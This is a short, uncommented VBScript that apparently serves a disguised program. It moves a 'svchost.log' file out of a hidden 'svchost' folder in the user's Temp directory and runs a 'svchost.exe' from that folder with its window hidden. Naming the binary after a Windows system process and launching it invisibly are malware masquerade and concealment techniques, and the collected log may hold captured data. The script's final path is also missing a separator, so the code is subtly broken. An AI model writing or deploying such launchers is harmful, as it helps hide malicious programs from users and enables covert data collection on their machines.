Set objShell = Wscript.CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objNetwork = CreateObject("Wscript.Network")
usr = objNetwork.UserName
SourcePath = objFSO.GetAbsolutePathName(".")
dir_path = "C:\Users\" & objNetwork.UserName & "\AppData\Local\Temp\svchost"
objFSO.MoveFile (dir_path & "\svchost.log"), (SourcePath & "\svchost_log.log")
objShell.Run dir_path & "svchost.exe", 0, True
WScript.Quit
